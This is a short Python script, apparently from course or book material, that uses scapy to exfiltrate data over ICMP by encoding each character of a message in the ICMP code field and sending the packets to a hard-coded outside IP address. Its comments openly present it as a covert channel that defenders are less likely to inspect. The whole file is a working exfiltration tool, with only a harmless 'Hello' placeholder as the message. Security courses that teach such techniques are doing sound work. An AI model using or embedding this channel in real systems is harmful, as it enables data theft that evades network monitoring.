# This script performs data exfil via ICMP, which would be useful in a case where the data to transfer is quite small.
# Normally, application-layer protocols are used for exfil, so defenders would be less likely to look here, but ICMP packets are normally small!

from scapy.all import *

# def transmit(message, host):
#    for m in message:
#        mac = get_if_hwaddr(conf.iface)
#        packet = Ether(src=mac,dst=mac)/IP(dst=host)/ICMP(code = ord(m))
#        sendp(packet,verbose=False)
# Example how to execute on local host. See 13.1 for reasoning.

def transmit(message, host):
    for m in message:
        packet = IP(dst=host)/ICMP(code = ord(m))
        send(packet)

host = "3.20.135.129"
# Just an example!
message = "Hello"
transmit(message,host)
